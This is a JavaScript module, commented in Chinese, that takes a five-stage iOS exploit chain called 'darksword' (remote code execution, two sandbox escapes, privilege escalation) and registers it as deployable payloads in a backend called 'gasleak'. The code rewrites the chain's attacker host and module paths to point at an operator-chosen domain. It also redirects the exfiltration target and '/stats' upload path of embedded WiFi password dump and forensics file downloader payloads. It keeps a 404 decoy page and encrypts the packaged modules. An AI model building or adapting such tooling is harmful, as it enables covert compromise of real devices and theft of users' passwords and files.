/**
 * chain-darksword —— 把 darksword 五模块注册为 gasleak 的 Payload 条目
 *
 * 模块接力顺序**不可调换**（见 darksword/CHAIN-FLOW.md，已代码核实）：
 *   rce_loader.js → rce_worker.js → sbx0_main_18.4.js → sbx1_main.js → pe_main.js
 * 前一个 eval 后一个；sbx0 依赖 worker 的 fcall，sbx1 依赖 sbx0 的跨进程桥梁，
 * pe_main 依赖 sbx1 的内核读写。
 *
 * 【已核实】darksword 的硬编码 URL 分布：
 *   rce_loader.js:8    let localHost = "https://sqwas.ebwlyais.xyz/assets"   ← 唯一 base 变量
 *   rce_loader.js:31   redirect() -> ".../assets/404.html"
 *   rce_loader.js:81   getJS(`.../assets/rce_worker_18.6.js?...`)            (18,6*)
 *   rce_loader.js:83   getJS(`.../assets/rce_worker_18.4.js?...`)            (else)
 *   rce_loader.js:177  getJS(`.../assets/rce_module_18.6.js?...`)
 *   rce_loader.js:179  getJS(`.../assets/rce_module.js?...`)
 *   rce_worker_18.4.js:938   getJS('/sbx0_main_18.4.js')      ← 相对路径
 *   sbx0_main_18.4.js:8421   getJS('/sbx1_main.js')           ← 相对路径
 *   sbx1_main.js:6765        get_cstring(getJS('pe_main.js')) ← 相对路径
 *
 * 因此改造分两类：
 *   (a) rce_loader.js 的绝对 URL -> 统一指向本后台 /details/ds/
 *   (b) 三个相对路径 -> 改为绝对路径 /details/ds/
 * 二者都通过 PATCH_RULES 用字符串替换完成，不改动 darksword 源码本体。
 */

import path from 'node:path';
import crypto from 'node:crypto';
import { readFile, mkdir, writeFile } from 'node:fs/promises';
// ★ I1-C2 修复（承接 I1-C1 的 P1 Finding）：路径层级修正，理由同 chain-coruna.js。
import { PayloadCrypto } from '../../../core/crypto/seven-zip.js';
import { packModule, inferPackMode } from './module-packer.js';

/** darksword 原始主机前缀（待替换）。★ patchRules 的规则字面量由此常量派生（单源真相）。 */
export const DS_ORIGIN = 'https://sqwas.ebwlyais.xyz/assets';

/** 正则转义：把字面量前缀安全嵌入 RegExp，避免常量与规则各自漂移 */
function reEsc(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/**
 * 校验渠道 base 是否为合法 http(s) 源。
 * ★ W-IOS-02 判据 3：非法域名必须**显式报错**，绝不生成半成品载荷。
 * 在读取 / 写入任何模块之前调用 ⇒ 失败时磁盘上不会留下任何产物。
 */
export function assertValidBase(base) {
  if (typeof base !== 'string' || !base.trim()) {
    throw new Error('chain-darksword: base 为空 —— 拒绝生成半成品载荷');
  }
  let u;
  try { u = new URL(base); } catch {
    throw new Error(`chain-darksword: base 非法（不是合法 URL）: ${JSON.stringify(base)}`);
  }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') {
    throw new Error(`chain-darksword: base 非法（协议必须是 http/https）: ${base}`);
  }
  if (!u.hostname) {
    throw new Error(`chain-darksword: base 非法（缺少主机名）: ${base}`);
  }
  return u;
}

/**
 * 五模块定义。src 为 darksword 目录下的源文件。
 * 18.6 分支的两个文件是 18.4 的变体，是否需要一并注册取决于目标版本范围：
 *   - 只做 18.4/18.4.1 完整链 -> 只需 18.4 系列
 *   - 覆盖 18.5–18.6.2 前段   -> 额外需要 rce_worker_18.6.js / rce_module_18.6.js
 */
export const DARKSWORD_MODULES = [
  { name: 'ds_rce_loader', src: 'rce_loader.js',      cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_rce_worker', src: 'rce_worker_18.4.js', cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_sbx0',       src: 'sbx0_main_18.4.js',  cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_sbx1',       src: 'sbx1_main.js',       cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_pe_main',    src: 'pe_main.js',         cold: 0, doNotCloseAfterRun: 1 },
];

/** 18.5–18.6.2 前段所需的额外模块 */
export const DARKSWORD_MODULES_EXTRA = [
  { name: 'ds_rce_worker_186', src: 'rce_worker_18.6.js', cold: 0, doNotCloseAfterRun: 1 },
  { name: 'ds_rce_module_186', src: 'rce_module_18.6.js', cold: 0, doNotCloseAfterRun: 1 },
];

/**
 * pe_main 内嵌 payload 的上报目标（已解 webpack 核实）
 *
 * pe_main.js 是 webpack bundle，内含 **3 个内嵌 payload**：
 *   [0] @172541  webpackBootstrap 壳
 *   [1] @467128  WiFi Password Dump Payload
 *   [2] @503316  WiFi Password Dump Payload
 * 另有 Forensics File Downloader（@1372 起）。
 *
 * 【关键】它们**不用 fetch/XHR**，而是用裸 POSIX socket
 * （socket / inet_addr / htons / connect）+ TLS，因此上报目标是**主机常量**而非 URL：
 *   const SERVER_HOST = "sqwas.ebwlyais.xyz"   ← 出现 3 次（@294839 / @467339 / @503527）
 *   const HTTP_PORT   = 80
 *   const HTTPS_PORT  = 443
 *   const SERVER_PORT = 443
 *   const UPLOAD_PATH = "/stats"               ← 出现 1 次（@294932）
 *
 * 注意源码中是**双重转义的字符串字面量**（webpack 把 payload 存为字符串），
 * 故正则要匹配 \" 形式。替换后需保证重新打包时转义层数一致。
 */
export const PE_MAIN_TARGETS = {
  host: 'sqwas.ebwlyais.xyz',
  uploadPath: '/stats',
  /**
   * 生成 pe_main 的替换规则。
   * @param {string} newHost 目标主机（不含协议/端口），如 'abc123.icu'
   * @param {string} newPath 上报路径，默认沿用 /stats
   */
  rulesFor(newHost, newPath = '/stats') {
    return [
      { id: 'pe-server-host',
        from: /const SERVER_HOST = \\"sqwas\.ebwlyais\.xyz\\"/g,
        to:   `const SERVER_HOST = \\"${newHost}\\"` },
      { id: 'pe-upload-path',
        from: /const UPLOAD_PATH = \\"\/stats\\"/g,
        to:   `const UPLOAD_PATH = \\"${newPath}\\"` },
    ];
  },
};

/**
 * 字符串替换规则：把 darksword 的原始取值指向本后台。
 * base 形如 'https://<channel.primaryDomain>'（无尾斜杠）。
 */
export function patchRules(base) {
  const O = reEsc(DS_ORIGIN);
  return [
    // (a) 入口 base 变量 —— 注意源码是 var 而非 let（已核实 rce_loader.js:8）
    { id: 'base-url',
      from: new RegExp(`var localHost = "${O}"`, 'g'),
      to:   `var localHost = "${base}/details"` },

    // (b) 三个相对路径 -> 绝对（模块接力）
    { id: 'worker->sbx0',
      from: /getJS\('\/sbx0_main_18\.4\.js'\)/g, to: `getJS('${base}/details/ds/sbx0')` },
    { id: 'sbx0->sbx1',
      from: /getJS\('\/sbx1_main\.js'\)/g,       to: `getJS('${base}/details/ds/sbx1')` },
    { id: 'sbx1->pe_main',
      from: /getJS\('pe_main\.js'\)/g,           to: `getJS('${base}/details/ds/pe_main')` },

    // (c) 入口内其余绝对 URL（worker / module 变体）
    { id: 'worker-186',
      from: new RegExp(reEsc(DS_ORIGIN + '/rce_worker_18.6.js'), 'g'),
      to:   `${base}/details/ds/rce_worker_186` },
    { id: 'worker-184',
      from: new RegExp(reEsc(DS_ORIGIN + '/rce_worker_18.4.js'), 'g'),
      to:   `${base}/details/ds/rce_worker` },
    { id: 'module-186',
      from: new RegExp(reEsc(DS_ORIGIN + '/rce_module_18.6.js'), 'g'),
      to:   `${base}/details/ds/rce_module_186` },
    { id: 'module-base',
      from: new RegExp(reEsc(DS_ORIGIN + '/rce_module.js'), 'g'),
      to:   `${base}/details/ds/rce_module` },

    // (d) 404 诱饵跳转（保持同域，避免暴露外站）
    { id: 'decoy-404',
      from: new RegExp(reEsc(DS_ORIGIN + '/404.html'), 'g'),
      to:   `${base}/404.html` },
  ];
}

/** 对单个模块源码应用替换规则；返回 Buffer、按 id 的命中计数 */
export function applyPatchRules(buf, base) {
  let s = buf.toString('utf8');
  const hits = {};
  for (const r of patchRules(base)) {
    const n = (s.match(r.from) || []).length;
    if (n) { hits[r.id] = n; s = s.replace(r.from, r.to); }
  }
  return { out: Buffer.from(s, 'utf8'), hits };
}

/**
 * 同步 darksword 模块到 storageRoot/payloads，返回可写入 Payload 表的记录。
 * @param {string} srcDir       darksword 源码目录
 * @param {string} storageRoot  gasleak 存储根
 * @param {string} base         渠道 base，如 https://xxx.icu
 * @param {boolean} include186  是否一并注册 18.6 变体
 */
/**
 * 同步 darksword 模块到 storageRoot/payloads，返回可写入 Payload 表的记录。
 * @param {string} srcDir       darksword 源码目录
 * @param {string} storageRoot  gasleak 存储根
 * @param {string} base         渠道 base，如 https://xxx.icu
 * @param {boolean} include186  是否一并注册 18.6 变体
 * @param {string|null} host    渠道主机（用于 pe_main 内嵌 payload 上报目标）
 * @param {'auto'|'dylib'|'js-plain'|'js-b64'|'binary'} packMode 封装模式，默认 auto
 */
export async function syncDarkswordPayloads(srcDir, storageRoot, base, include186 = false, host = null, packMode = 'auto') {
  // ★ W-IOS-02 判据 3：非法域名在**任何读写之前**即抛错 ⇒ 磁盘不留半成品
  assertValidBase(base);

  const defs = include186 ? [...DARKSWORD_MODULES, ...DARKSWORD_MODULES_EXTRA] : DARKSWORD_MODULES;

  // 渠道主机（用于 pe_main 内嵌 payload 的上报目标）
  const chanHost = host || (() => {
    try { return new URL(base).hostname; } catch { return null; }
  })();

  // ---- 阶段一：读取 + 打补丁 + 命中自检（全部通过后才允许落盘）----
  const prepared = [];
  const report = [];
  for (const m of defs) {
    const raw = await readFile(path.join(srcDir, m.src));
    let { out: patched, hits } = applyPatchRules(raw, base);

    // pe_main：额外替换内嵌 payload 的 SERVER_HOST / UPLOAD_PATH
    if (m.name === 'ds_pe_main' && chanHost) {
      const pr = PE_MAIN_TARGETS.rulesFor(chanHost);
      let s = patched.toString('utf8');
      for (const r of pr) {
        const n = (s.match(r.from) || []).length;
        if (n) { hits[r.id] = n; s = s.replace(r.from, r.to); }
      }
      patched = Buffer.from(s, 'utf8');
    }

    // 封装：默认按源文件形态自动推断（darksword 模块是明文 JS -> js-plain）
    const mode = packMode === 'auto' ? inferPackMode(patched, m.src) : packMode;
    prepared.push({ m, patched, mode });
    report.push({ name: m.name, src: m.src, hits, size: patched.length, packMode: mode });
  }

  // ★ W-IOS-02 判据 2：必需替换点未命中即显式失败 —— 不静默兜底、不落半成品
  const sc = selfCheck(report, !!chanHost);
  if (!sc.ok) {
    throw new Error(`chain-darksword: 必需替换点未命中，拒绝生成半成品载荷: ${sc.problems.join('; ')}`);
  }

  // ---- 阶段二：封装 + 落盘（此时已确认无失败可能）----
  const out = [];
  for (const { m, patched, mode } of prepared) {
    const encName = `${m.name}.dat`;
    const encPath = path.join(storageRoot, 'payloads', encName);
    const { bytes } = await packModule(mode, patched, encPath, { PayloadCrypto });

    out.push({
      name: m.name,
      bundleId: '',
      type: 'module',
      active: true,
      cold: m.cold,
      doNotCloseAfterRun: m.doNotCloseAfterRun,
      sha256: crypto.createHash('sha256').update(patched).digest('hex'),
      size: bytes,
      encryptedPath: `payloads/${encName}`,
      packMode: mode,
      updatedAt: new Date(),
      createdAt: new Date(),
    });
    const r = report.find((x) => x.name === m.name);
    if (r) r.size = bytes;
  }

  return { records: out, report, chanHost };
}

/**
 * 每个模块**必须**命中的规则 id。
 *
 * 说明（已核实）：
 *  - ds_rce_loader : 有 base 变量 + 4 个模块 URL + 404 诱饵
 *  - ds_rce_worker : 只通过 getJS('/sbx0_main_18.4.js') 接力下一模块
 *  - ds_sbx0       : 只通过 getJS('/sbx1_main.js') 接力
 *  - ds_sbx1       : 只通过 getJS('pe_main.js') 接力
 *  - ds_pe_main    : **终端载荷**，不再 load 任何模块（无 getJS/fetch）。
 *                    其内部 "http://\" 命中来自 webpack 内嵌的 native payload
 *                    源码字符串（forensics downloader / wifi dump），不是真实 URL，
 *                    故**期望 0 命中**，不列入必需。
 */
export const REQUIRED_RULE_IDS = {
  ds_rce_loader: ['base-url', 'worker-186', 'worker-184', 'module-186', 'module-base', 'decoy-404'],
  ds_rce_worker: ['worker->sbx0'],
  ds_sbx0:       ['sbx0->sbx1'],
  ds_sbx1:       ['sbx1->pe_main'],
  // pe_main 是终端载荷（不 load 后续模块），但内嵌 payload 的
  // SERVER_HOST / UPLOAD_PATH 必须替换 —— 提供 host 时才算必需
  ds_pe_main:    ['pe-server-host', 'pe-upload-path'],
  ds_rce_worker_186: [],
  ds_rce_module_186: [],
};

/** pe_main 的必需规则只在传入 host 时才要求 */
export const PE_MAIN_RULES_CONDITIONAL = true;

/**
 * 自检：确认各模块的必需替换点都命中。
 * @param {Array} report   syncDarkswordPayloads 的 report
 * @param {boolean} hasHost 是否传入了渠道 host（决定 pe_main 规则是否必需）
 */
export function selfCheck(report, hasHost = true) {
  const problems = [];
  for (const r of report) {
    let required = REQUIRED_RULE_IDS[r.name];
    if (!required) continue;
    // 未提供 host 时，pe_main 的两条规则不作要求
    if (!hasHost && r.name === 'ds_pe_main') required = [];
    for (const id of required) {
      if (!(r.hits && r.hits[id])) {
        problems.push(`${r.name}: 未命中必需规则 "${id}"`);
      }
    }
  }
  return { ok: problems.length === 0, problems };
}
